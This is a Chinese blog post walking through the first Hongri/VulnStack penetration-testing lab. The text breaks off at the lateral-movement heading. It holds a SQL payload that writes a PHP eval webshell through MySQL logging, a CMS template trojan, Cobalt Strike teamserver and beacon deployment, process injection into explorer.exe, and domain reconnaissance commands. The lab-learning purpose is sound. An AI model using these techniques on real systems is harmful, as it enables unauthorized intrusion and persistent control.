@@ -1,0 +1,1429 @@
+<!DOCTYPE html>
+<html lang="en-us" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="内网太菜了，学习一下。">
+<title>红日靶机练习(第一章)</title>
+
+<link rel='canonical' href='https://xxxxctfer.github.io/p/%E7%BA%A2%E6%97%A5%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0%E7%AC%AC%E4%B8%80%E7%AB%A0/'>
+
+<link rel="stylesheet" href="/scss/style.min.1ae76ab9aa3beab52f99d9b5f59d64d06778453e93ff523a98332d15179df142.css"><meta property='og:title' content="红日靶机练习(第一章)">
+<meta property='og:description' content="内网太菜了，学习一下。">
+<meta property='og:url' content='https://xxxxctfer.github.io/p/%E7%BA%A2%E6%97%A5%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0%E7%AC%AC%E4%B8%80%E7%AB%A0/'>
+<meta property='og:site_name' content='xxxx'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2026-03-25T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2026-03-25T00:00:00&#43;00:00'/><meta property='og:image' content='https://xxxxctfer.github.io/images/hongri/Attack1/%E9%9D%B6%E5%9C%BA1.3.png' />
+<meta name="twitter:title" content="红日靶机练习(第一章)">
+<meta name="twitter:description" content="内网太菜了，学习一下。"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://xxxxctfer.github.io/images/hongri/Attack1/%E9%9D%B6%E5%9C%BA1.3.png' />
+    <link rel="shortcut icon" href="/favicon.ico" />
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu_a014c1f4876185e.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🥰</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">xxxx</a></h1>
+            <h2 class="site-description">一个还在努力的xxxx</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://github.com/xxxxctfer'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>归档</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>搜索</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%8F%8B%E9%93%BE/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>友链</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc stack-toc">
+            <ol class="toc-level-1"><li class="toc-item-h1">
+                        <a href="#%e7%8e%af%e5%a2%83%e6%90%ad%e5%bb%ba%e7%8e%af%e5%a2%83%e6%90%ad%e5%bb%ba%0a%3c%2fh1%3e" aria-label="环境搭建 ">环境搭建 </a><li class="toc-item-h1">
+                        <a href="#%e5%85%a5%e5%8f%a3%e6%9c%ba%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86get-webshell%e5%85%a5%e5%8f%a3%e6%9c%ba%28%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%2fget%20webshell%29%0a%3c%2fh1%3e" aria-label="入口机(信息收集/get webshell) ">入口机(信息收集/get webshell) </a><li class="toc-item-h1">
+                        <a href="#%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81webshell%e6%8f%90%e5%8d%87%e8%87%b3shell%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81%28webshell%e6%8f%90%e5%8d%87%e8%87%b3shell%29%0a%3c%2fh1%3e" aria-label="权限维持(webshell提升至shell) ">权限维持(webshell提升至shell) </a><li class="toc-item-h1">
+                        <a href="#%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81%0a%3c%2fh1%3e" aria-label="权限维持 ">权限维持 </a><li class="toc-item-h1">
+                        <a href="#%e5%86%85%e7%bd%91%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%86%85%e7%bd%91%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%0a%3c%2fh1%3e" aria-label="内网信息收集 ">内网信息收集 </a><li class="toc-item-h1">
+                        <a href="#%e6%a8%aa%e5%90%91%e7%a7%bb%e5%8a%a8%e6%a8%aa%e5%90%91%e7%a7%bb%e5%8a%a8%0a%3c%2fh1%3e" aria-label="横向移动 ">横向移动 </a><li class="toc-item-h1">
+                        <a href="#%e9%bb%84%e9%87%91%e7%a5%a8%e6%8d%ae%e9%bb%84%e9%87%91%e7%a5%a8%e6%8d%ae%0a%3c%2fh1%3e" aria-label="黄金票据 ">黄金票据 </a><li class="toc-item-h1">
+                        <a href="#%e7%9f%a5%e8%af%86%e7%82%b9%e8%a7%a3%e6%9e%90%e7%9f%a5%e8%af%86%e7%82%b9%e8%a7%a3%e6%9e%90%0a%3c%2fh1%3e" aria-label="知识点解析 ">知识点解析 </a><ol class="toc-level-2"><li class="toc-item-h2">
+                        <a href="#%e9%bb%84%e9%87%91%e7%a5%a8%e6%8d%ae-1%e9%bb%84%e9%87%91%e7%a5%a8%e6%8d%ae%0a%3c%2fh2%3e" aria-label="黄金票据 ">黄金票据 </a><li class="toc-item-h2">
+                        <a href="#%e5%93%88%e5%b8%8c%e7%a0%81%e6%a8%aa%e5%90%91%e7%a7%bb%e5%8a%a8%e5%93%88%e5%b8%8c%e7%a0%81%e6%a8%aa%e5%90%91%e7%a7%bb%e5%8a%a8%0a%3c%2fh2%3e" aria-label="哈希码横向移动 ">哈希码横向移动 </a><li class="toc-item-h2">
+                        <a href="#inject%e6%93%8d%e4%bd%9cinject%e6%93%8d%e4%bd%9c%0a%3c%2fh2%3e" aria-label="inject操作 ">inject操作 </a></ol></li></ol></li></div>
+    </section>
+
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/%E7%BA%A2%E6%97%A5%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0%E7%AC%AC%E4%B8%80%E7%AB%A0/">
+                
+                    <img src="/images/hongri/Attack1/%e9%9d%b6%e5%9c%ba1.3.png" loading="lazy" alt="Featured image of post 红日靶机练习(第一章)" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/web%E4%BA%BA/" >
+                Web人
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/%E7%BA%A2%E6%97%A5%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0%E7%AC%AC%E4%B8%80%E7%AB%A0/">红日靶机练习(第一章)</a>
+        </h2>
+    
+        
+        <h3 class="article-subtitle">
+            内网太菜了，学习一下。
+        </h3>
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published" datetime='2026-03-25T00:00:00Z'>2026-03-25</time>
+            </div>
+        
+
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <p>首先先访问一下靶场的地址。http://vulnstack.qiyuanxuetang.net/vuln/，东西很多，不止蓝队的，红队的也有，留好存储空间，然后把靶场下载下来，这里是写的第一个靶场的。</p>
+<h1 id="环境搭建">环境搭建
+</h1><p>下载好之后是三个虚拟机的vmx文件，直接加载进去VMware中，然后配置一下虚拟网段。
+<img src="/images/hongri/Attack1/%e9%9d%b6%e5%9c%ba1.1.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="示例"
+	
+	
+></p>
+<p>我这里设置了一下网段的IP是多少的，这里设的是192.168.52.0/24的，然后我们另外两台虚拟机设置为这个网段的就行，主要是win7的虚拟机，因为是入口机，所以这里要给他一个出网的网段。
+<img src="/images/hongri/Attack1/%e9%9d%b6%e5%9c%ba1.2.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="示例"
+	
+	
+></p>
+<p>设置好了之后就可以开启虚拟机了，一般来说密码是hongrisec@2019，但是除了win7，另外两台要改密码，不过直接改就行了，这个问题不大。改了之后我们可以测试win7能不能出网，直接ping baidu.com就行。
+<img src="/images/hongri/Attack1/%e9%9d%b6%e5%9c%ba1.3.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="示例"
+	
+	
+></p>
+<p>很明显是可以出网的了，然后我们去C盘里面找到phpstudy来，直接打开服务，然后就可以访问了，用另外两台机子访问一下，可以看到有这个服务了。
+<img src="/images/hongri/Attack1/%e9%9d%b6%e5%9c%ba1.4.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="示例"
+	
+	
+></p>
+<p>IP自己去打ipconfig就可以找到。然后环境就搭建好了，我们来打。</p>
+<h1 id="入口机信息收集get-webshell">入口机(信息收集/get webshell)
+</h1><p>OK，这里模拟网络情况，是可以直接访问IP看到这个phpstudy。然后暂时还不知道内网IP段，这里先直接dirsearch扫描一遍。
+<img src="/images/hongri/Attack1/%e9%9d%b6%e5%9c%ba1.5.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="示例"
+	
+	
+></p>
+<p>很明显，扫出来一个phpMyadmin，说明有mysql的数据库，然后还有一个phpinfo.php，可以去翻一翻配置信息。这里就不看了，我们可以直接去看mysql。(其实探针那里还有可以说明的，等下说)
+<img src="/images/hongri/Attack1/%e9%9d%b6%e5%9c%ba1.6.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="示例"
+	
+	
+></p>
+<p>测试一下弱口令就进去了，还是比较简单的，降低了难度。
+<img src="/images/hongri/Attack1/%e9%9d%b6%e5%9c%ba1.7.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="示例"
+	
+	
+></p>
+<p>探针这里有一个链接检测的东西，可以测试用户密码，这里也可以直接告诉我们有mysql，并且可以测试出弱口令。
+然后成功进去之后要去拿shell了，先看可不可以写文件。
+<img src="/images/hongri/Attack1/%e9%9d%b6%e5%9c%ba1.8.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="示例"
+	
+	
+></p>
+<p>好，直接就是一个写不了，那再看看日志的路径，看看可不可以日志包含去打。
+<img src="/images/hongri/Attack1/%e9%9d%b6%e5%9c%ba1.9.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="示例"
+	
+	
+></p>
+<p>OK，有这个东西，我们可以去改日志路径，然后写PHP代码进去，打一个webshell出来。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-SQL" data-lang="SQL"><span class="line"><span class="cl"><span class="k">SET</span><span class="w"> </span><span class="k">GLOBAL</span><span class="w"> </span><span class="n">general_log_file</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;C:\\phpStudy\\WWW\\xxxx.php&#39;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="k">SET</span><span class="w"> </span><span class="k">GLOBAL</span><span class="w"> </span><span class="n">general_log</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">ON</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="k">SELECT</span><span class="w"> </span><span class="s1">&#39;&lt;?php @eval($_POST[&#34;xxxx&#34;]);?&gt;&#39;</span><span class="w"> </span><span class="k">AS</span><span class="w"> </span><span class="n">inject_code</span><span class="p">;</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>我们按这一段payload去打，基本上就可以打出来，我们这里先SET一下，然后查询看看是啥情况。
+<img src="/images/hongri/Attack1/%e9%9d%b6%e5%9c%ba1.10.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="示例"
+	
+	
+></p>
+<p>很明显已经OK了，现在直接打代码进去，然后蚁剑连接即可。
+<img src="/images/hongri/Attack1/%e9%9d%b6%e5%9c%ba1.11.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="示例"
+	
+	
+></p>
+<p>OK，可以看到是连接成功了啊，我们直接去开shell看看。
+<img src="/images/hongri/Attack1/%e9%9d%b6%e5%9c%ba1.12.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="示例"
+	
+	
+></p>
+<p>OK了，这里应该是没什么毛病了。
+发现有一个cms在里面，一开始没搞出来的。(字典太菜了)
+<img src="/images/hongri/Attack1/%e9%9d%b6%e5%9c%ba1.19.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="示例"
+	
+	
+></p>
+<p>现在看看怎么打吧。然后有一个公告信息，提示我们要去后台管理界面，这里是靶场，真实环境下不能这么敷衍，cms要去打基本上就是找找源代码，看看后台登录在哪里，弱口令尝试一下先，一个初步思路。
+<img src="/images/hongri/Attack1/%e9%9d%b6%e5%9c%ba1.20.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="示例"
+	
+	
+></p>
+<p>然后我们就可以去登录了。
+<img src="/images/hongri/Attack1/%e9%9d%b6%e5%9c%ba1.21.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="示例"
+	
+	
+></p>
+<p>成功登录啊，简单看看功能，有没有可以getshell的地方。
+<img src="/images/hongri/Attack1/%e9%9d%b6%e5%9c%ba1.52.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="示例"
+	
+	
+></p>
+<p>看到有一个前台模板管理的页面，可以去编辑PHP代码，那很明显我们可以去编写一个一句话木马进去到一个文件中，但是要去找到这些模板文件在哪里。我们随便找一找或者扫描一下这个URL，就可以扫到一个robots.txt文件，内容如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">#
+</span></span><span class="line"><span class="cl"># robots.txt for YXCMS
+</span></span><span class="line"><span class="cl">#
+</span></span><span class="line"><span class="cl">User-agent: * 
+</span></span><span class="line"><span class="cl">Disallow: /data
+</span></span><span class="line"><span class="cl">Disallow: /protected
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>我们直接看protected的路径下面，就可以看到一个类似文件管理的页面。(其实这里目录扫描可以扫除网站源代码出来，直接找文件路径就行，不过也差不多)
+<img src="/images/hongri/Attack1/%e9%9d%b6%e5%9c%ba1.22.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="示例"
+	
+	
+></p>
+<p>随便往下面找找就可以找到前面放的一句话木马，我这里用的info.php，在http://192.168.200.143/yxcms/protected/apps/default/view/default/目录下就可以找到，然后直接蚁剑连接即可。
+<img src="/images/hongri/Attack1/%e9%9d%b6%e5%9c%ba1.23.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="示例"
+	
+	
+></p>
+<h1 id="权限维持webshell提升至shell">权限维持(webshell提升至shell)
+</h1><p>有一个之前没有思考过的东西就是这里平常就是直接打后续了，没有换shell，这里换shell的方式还挺多的，先记录一下，有时间都会练习一下。这里先用CS打一下吧。
+先去github上面下载一下工具。https://github.com/k8gege/Aggressor/releases/tag/cs，这里下的是K8_CS的版本，方便启动一点，然后到kali上面直接解压出来，然后就可以打命令了。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">./teamserver 192.168.200.130 <span class="m">123456</span>
+</span></span><span class="line"><span class="cl">Windows主机上面启动：
+</span></span><span class="line"><span class="cl">java -XX:ParallelGCThreads<span class="o">=</span><span class="m">4</span> -XX:+AggressiveHeap -XX:+UseParallelGC -javaagent:uHook.jar -Dfile.encoding<span class="o">=</span>utf-8 -jar cobaltstrike-client.jar
+</span></span><span class="line"><span class="cl">或者可执行的脚本一键启动
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后就可以顺利启动图形化界面了。
+<img src="/images/hongri/Attack1/%e9%9d%b6%e5%9c%ba1.13.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="示例"
+	
+	
+></p>
+<p>然后直接连接即可。连接上了之后我们就可以准备监听了。
+<img src="/images/hongri/Attack1/%e9%9d%b6%e5%9c%ba1.14.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="示例"
+	
+	
+></p>
+<p>然后我们就可以让他生成恶意的exe文件出来了。
+<img src="/images/hongri/Attack1/%e9%9d%b6%e5%9c%ba1.16.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="示例"
+	
+	
+></p>
+<p>生成之后就可以上传到蚁剑上面，然后直接运行即可。
+<img src="/images/hongri/Attack1/%e9%9d%b6%e5%9c%ba1.17.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="示例"
+	
+	
+></p>
+<p>然后就可以在CS这边看到上线的主机了。
+<img src="/images/hongri/Attack1/%e9%9d%b6%e5%9c%ba1.18.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="示例"
+	
+	
+></p>
+<p>OK，这里差不多就有一个可持续后门了。然后我们就可以去做一下权限维持相关的东西，也算是学习一下CS的用法吧。</p>
+<h1 id="权限维持">权限维持
+</h1><p>还是以CS的为例啊，我们双击监听到的主机之后，就可以启动他的shell，或者说是cmd，这个无所谓，我们的木马exe比较容易被删，我们这里先ps看看有什么常见的进程，对了先用sleep调一下响应时间，默认是60s，太慢了，建议sleep 3。
+<img src="/images/hongri/Attack1/%e9%9d%b6%e5%9c%ba1.24.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="示例"
+	
+	
+></p>
+<p>看了一遍啊，我们这里选择用
+<strong>888   224   explorer.exe                           x64   1           GOD\Administrator</strong>
+这个进程，直接使用inject去注入。
+<img src="/images/hongri/Attack1/%e9%9d%b6%e5%9c%ba1.25.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="示例"
+	
+	
+></p>
+<p>然后会弹一个窗口出来，我们选择一下监听器。
+<img src="/images/hongri/Attack1/%e9%9d%b6%e5%9c%ba1.26.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="示例"
+	
+	
+></p>
+<p>很难绷啊，这里要设置一下架构，不然默认x86，即32位的，64位程序就注入不进去了，这里就已经成功注入了，我们去删一下我们前面这个进程。
+<img src="/images/hongri/Attack1/%e9%9d%b6%e5%9c%ba1.27.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="示例"
+	
+	
+></p>
+<p>OK，成功下线木马程序。然后我们就可以开始域渗透了。</p>
+<h1 id="内网信息收集">内网信息收集
+</h1><p>我们先来做一下内网的信息收集。分下面几个步骤进行吧，如果后续有新东西也会继续补充。</p>
+<ol>
+<li>确认木马的权限
+<code>getpid</code>和<code>getsystem</code>，可以确认当前的权限</li>
+<li>查看局域网内的其他主机名
+常用命令是<code>net view</code>，其他的也放在下面了。</li>
+<li>确认域后缀，是哪个域的，有几个域，域主机名
+<code>shell ipconfig/all</code>，<code>shell net view /domain</code>，<code>run net group &quot;domain controllers&quot; /domain</code>。</li>
+<li>找到域控服务器的主机和内网IP
+加上域后缀来ping对应的主机，就可以找到对应的域控服务器了。<code>shell ping 主机名.域后缀</code></li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">查看局域网内的其他主机名：
+</span></span><span class="line"><span class="cl">net view                 # 查看局域网内其他主机名
+</span></span><span class="line"><span class="cl">net config Workstation   # 查看计算机名、全名、用户名、系统版本、工作站、域、登录域
+</span></span><span class="line"><span class="cl">net user                 # 查看本机用户列表
+</span></span><span class="line"><span class="cl">net user /domain         # 查看域用户
+</span></span><span class="line"><span class="cl">net localgroup administrators # 查看本地管理员组（通常会有域用户）
+</span></span><span class="line"><span class="cl">net view /domain         # 查看有几个域
+</span></span><span class="line"><span class="cl">net user 用户名 /domain   # 获取指定域用户的信息
+</span></span><span class="line"><span class="cl">net group /domain        # 查看域里面的工作组，查看把用户分了多少组（只能在域控上操作）
+</span></span><span class="line"><span class="cl">net group 组名 /domain    # 查看域中某工作组
+</span></span><span class="line"><span class="cl">net group &#34;domain admins&#34; /domain  # 查看域管理员的名字
+</span></span><span class="line"><span class="cl">net group &#34;domain computers&#34; /domain  # 查看域中的其他主机名
+</span></span><span class="line"><span class="cl">net group &#34;doamin controllers&#34; /domain  # 查看域控制器主机名（可能有多台）
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>OK，大概了解了一下之后，我们就可以开始打命令了。
+先看权限。
+<img src="/images/hongri/Attack1/%e9%9d%b6%e5%9c%ba1.28.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="示例"
+	
+	
+></p>
+<p>OK，设置好了，然后再去看域中其他主机。
+<img src="/images/hongri/Attack1/%e9%9d%b6%e5%9c%ba1.29.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="示例"
+	
+	
+></p>
+<p>这里自己的主机没显示出来，但是后面也可以看到。
+<img src="/images/hongri/Attack1/%e9%9d%b6%e5%9c%ba1.30.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="示例"
+	
+	
+></p>
+<p>可以看到域名后缀是<code>god.org</code>，然后我们看一下域控是谁。
+<img src="/images/hongri/Attack1/%e9%9d%b6%e5%9c%ba1.31.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="示例"
+	
+	
+></p>
+<p>OK了，那就确定主机名是owa了，我们直接去ping一下owa.god.org
+<img src="/images/hongri/Attack1/%e9%9d%b6%e5%9c%ba1.32.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="示例"
+	
+	
+></p>
+<p>OK，确定了，信息收集差不多先这样，我们后面就是打横向了。</p>
+<h1 id="横向移动">横向移动
+</h1><p>我们先来看看这个域控有没有什么存活的服务，扫一下它的端口，看看有什么东西不。
